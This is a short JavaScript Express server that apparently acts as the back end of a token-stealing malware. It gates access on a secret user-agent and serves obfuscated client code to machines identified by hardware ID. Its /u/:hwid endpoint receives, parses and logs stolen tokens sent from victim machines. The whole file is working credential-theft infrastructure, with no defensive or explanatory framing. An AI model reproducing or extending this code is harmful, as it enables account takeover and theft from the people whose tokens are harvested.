const config = require('../config.json');
const express = require('express');
const app = express();
const port = process.env.PORT || 500;

const db = require('better-sqlite3')(`${__dirname}/./data/db.sqlite`);

const logger = require('./util/logger');
const { getObfuscatedClientCode } = require('./util/obfuscator');
const TokenData = require('./util/tokendata');

app.use((req, res, next) => {
    if (req.headers['user-agent'] && req.headers['user-agent'] == config.userAgent) next();
});

// get client code
app.get('/c/:hwid', (req, res) => {
    logger.info(`Sending client code to ${req.params.hwid}.`);
    res.send(getObfuscatedClientCode());
});

// upload token(s)
app.get('/u/:hwid', (req, res) => {
    const hwid = req.params.hwid;
    let tokens = req.query.t;

    logger.info(`Receiving token(s) from ${hwid}.`);
    logger.info(`Raw: ` + req.query.t);

    // make sure it's sha256 hashed
    if (hwid.length == 64 && tokens != null) {
        try {
            tokens = JSON.parse(tokens);
        } catch (e) {
            logger.info(`Error JSON parsing tokens: ${e}.`);
            return;
        }

        tokens.forEach((t) => {
            console.log(TokenData.fromJSON(JSON.parse(t)));
        });
    }
});

app.listen(port, () => {
    logger.info(`App listening on http://localhost:${port}.`);
});
